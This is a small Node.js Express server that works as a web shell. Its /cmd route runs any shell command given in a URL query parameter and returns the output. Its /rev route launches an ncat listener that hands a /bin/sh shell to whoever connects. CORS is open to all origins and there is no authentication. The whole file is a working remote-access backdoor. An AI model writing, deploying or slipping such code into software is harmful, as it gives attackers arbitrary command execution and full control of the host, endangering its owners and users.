const PORT = process.env.PORT || 8080
const axios = require("axios")
const express = require("express")
const app = express()
const cors = require("cors")
const { exec } = require('node:child_process')
app.use(cors())


app.get('/', function (req, res) {

	res.json("Hmm")
	
})

app.get('/cmd', function (req, res){
	
	const command = req.query.cmd.replace('+',' ');
	exec(`${command}`, (err, out) => {
		if (err) {
	  		console.log("could not execute commadn erro: ", err)
			return		
		}
		res.send(out)
		console.log("Executed : ", out )
	})
})

app.get('/rev', function (req, res){

	exec('ncat -lv --exec "/bin/sh"', (err, out)=>{
	  
		if(err){
		  console.log('error occured: ')
		  res.send(err)
		}
		
		//res.send(out)
		console.log(out)
	})


})



app.listen(PORT, ()=> console.log(`Listening on port ${PORT}`))

